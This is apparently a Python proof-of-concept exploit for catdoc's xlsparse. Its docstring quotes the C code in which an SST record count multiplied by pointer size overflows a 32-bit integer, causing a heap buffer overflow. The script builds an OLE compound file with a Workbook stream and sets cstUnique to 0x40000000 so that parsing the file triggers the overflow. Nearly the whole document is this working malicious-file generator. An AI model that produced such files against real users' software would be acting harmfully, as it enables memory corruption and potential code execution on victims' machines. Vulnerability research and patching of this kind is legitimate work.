""" This is a 32-bit integer overflow that causes a buffer overflow.

src/xlsparse.c:137-416
	if (rectype != CONTINUE && prev_rectype == SST) {
		/* we have accumulated  unparsed SST, and now encountered
		 * another record, which indicates that SST is ended */
		/* fprintf(stderr,"parse sst!\n");*/
		parse_sst(sstBuffer,sstBytes);
	}	

src/xlsparse.c:185-204
	case SST: {
		/* Just copy SST into buffer, and wait until we get
		 * all CONTINUE records
		 */
/* 		fprintf(stderr,"SST\n"); */
		/* If exists first SST entry, then just drop it and start new*/
		if (sstBuffer != NULL) 
			free(sstBuffer);
		if (sst != NULL)
			free(sst);
		
		sstBuffer=(unsigned char*)malloc(reclen);
		sstBytes = reclen;
		if (sstBuffer == NULL ) {
			perror("SSTptr alloc error! ");
			exit(1);
		}	  
		memcpy(sstBuffer,rec,reclen);
		break;
	}	

src/xlsparse.c:186-198
	case CONTINUE: {
		if (prev_rectype != SST) {
			return; /* to avoid changing of prev_rectype;*/
		}    
		sstBuffer=realloc(sstBuffer,sstBytes+reclen);
		if (sstBuffer == NULL ) {
			perror("SSTptr realloc error! ");
			exit(1);
		}	  
		memcpy(sstBuffer+sstBytes,rec,reclen);
		sstBytes+=reclen;
		return;
	}			   

src/xlsparse.c:758-779
void parse_sst(unsigned char *sstbuf,int bufsize) {
	int i; /* index into sst */
	unsigned char *curString; /* pointer into unparsed buffer*/
	unsigned char *barrier=(unsigned char *)sstbuf+bufsize; /*pointer to end of buffer*/
	unsigned char **parsedString;/*pointer into parsed array*/ 
			
	sstsize = getlong(sstbuf+4,0);
	sst=(unsigned char **)malloc(sstsize*sizeof(unsigned char *));
	
	if (sst == NULL) {
		perror("SST allocation error");
		exit(1);
	}
	memset(sst,0,sstsize*sizeof(char *));
	for (i=0,parsedString=sst,curString=sstbuf+8;
			 i<sstsize && curString<barrier; i++,parsedString++) {
		/* 		fprintf(stderr,"copying %d string\n",i); */
		*parsedString = copy_unicode_string(&curString);
	}       
	/* 	fprintf(stderr,"end sst i=%d sstsize=%d\n",i,sstsize); */

}	

"""
import functools, operator, itertools, math, logging
import ptypes, office.storage, office.excel, office.tools
from office import storage, excel, tools
from ptypes import *

class u0(pint.uint_t): length = 0
class u8(pint.uint_t): length = 1
class u16(pint.uint_t): length = 2
class u32(pint.uint_t): length = 4
class u64(pint.uint_t): length = 8
class u128(pint.uint_t): length = 16
class s0(pint.sint_t): length = 0
class s8(pint.sint_t): length = 1
class s16(pint.sint_t): length = 2
class s32(pint.sint_t): length = 4
class s64(pint.sint_t): length = 8
class s128(pint.sint_t): length = 16

class do_table_bof(excel.BOF5):
    """
    catdoc's xlsparse incorrectly skips the version from the record type, and
    botches up the order for the year and release at the beginning of a stream.
    this structure is not according to spec, but sets the fields correctly as
    xlsparse wants it.
    """
    _fields_ = [
        #(uint2, 'vers'),
        #(DocType, 'dt'),
        (excel.uint2, 'rupBuild'),
        (excel.uint2, 'rupYear'),
    ]

if __name__ == '__main__':
    import sys

    if len(sys.argv) != 2:
        print("Usage: {:s} outfile".format(sys.argv[0] if sys.argv else __file__))
        sys.exit(1)

    # Create an empty structured storage document.
    destination = ptypes.prov.file(sys.argv[1], 'wb')
    storage.File(source=destination).a.commit(offset=0, source=destination)
    destination.close()

    # Load the document that we created, add 5 sectors for the fat, and grab it.
    store = storage.File(source=ptypes.prov.file(destination.file.name, 'rw'))
    store=store.l

    with tools.ModifyFat(store, markfat=True) as (_, out):
        out.extend(range(5))
    fat = store.Fat()

    # Now we can use it to add a sector for the directory entries.
    available = fat.availableEntries()
    with tools.ModifyDirectory(store) as (_, out):
        out[:] = [next(available)]

    # And add some sectors for the minifat.
    mfatsectors = fat.link(sector for _, sector in zip(range(2), available))
    fat.c, [fat[sector].d.a.c for sector in mfatsectors]
    with tools.ModifyMiniFat(store) as (_, out):
        out[:] = mfatsectors

    # We need a few sectors for the ministream, so allocate those first.
    minisectors = fat.link(sector for _, sector in zip(range(5), available))
    fat.c, [fat[sector].d.a.c for sector in minisectors]

    # Now we can add the directory entries. We need to add the root one first,
    # so that we can attach the ministream to it.
    directory = store.Directory()
    directory[0].alloc(Name='Root Entry', Type='Root', Flag='red')
    directory[0].set(sectLocation=minisectors[0], qwSize=fat.streamSize(len(minisectors)))
    directory.c

    # That should be mostly everything, so let's reload everything.
    store = store.l
    fat, mfat, directory = store.Fat(), store.MiniFat(), store.Directory()

    # Grab some sectors from the fat to store some data, and then use them to
    # add a directory entry that we can write to.
    sectors = fat.link(sector for _, sector in zip(range(fat.entries(262144)), fat.availableEntries()))
    fat.c, [fat[sector].d.a.c for sector in sectors]

    directory[1].alloc(Name='Workbook' or 'Book', Type='Stream', Flag='black')
    directory.connect_child(0, 1)
    directory[1].set(sectLocation=sectors[0], qwSize=fat.streamSize(len(sectors)))
    directory.c
    print(directory)

    # Now we can write stuff to the directory entry.
    with tools.ModifyDirectoryEntryData(store, directory[1]) as (org, new):
        records = []
        #bof = do_table_bof().alloc(rupYear=0x1111, rupBuild=0x2222)
        bof = excel.BOF5(_biffver=5).a
        eof = excel.EOF

        label = excel.LABEL().alloc(rw=0xffff, col=0xffff)
        records.append(label)
        label = excel.LABEL().alloc(rw=1, col=1)
        records.append(label)

        #src/xlsparse.c:137
        #void process_item (int rectype, int reclen, unsigned char *rec) {
        #src/xlsparse.c:758
        #void parse_sst(unsigned char *sstbuf,int bufsize) {
        #src/xlsparse.c:185
        #    case SST: {

        sst = excel.SST().a.set(cstTotal=1, cstUnique=0x40000000)
        records.append(sst)
        records.append(excel.Continue)
        records[:] = itertools.chain([bof], records, [eof])

        items = [excel.RecordGeneral().alloc(data=record) for record in records]
        size = sum(item.size() for item in items)
        stream = excel.RecordContainer(blocksize=lambda size=size: size).alloc(items)
        stream[0]['header']['length'].set(8)

        data = excel.File(version=8, blocksize=lambda:org.size()).alloc([stream])

        new.set(data.serialize())
        #new.load(source=ptypes.prov.proxy(org), length=org.size())
        #argh = itertools.chain(itertools.cycle(bytearray(range(0x100))))
        #new.set(bytearray(itertools.islice(argh, new.size())))

    sys.exit(0)
    store.source.close()
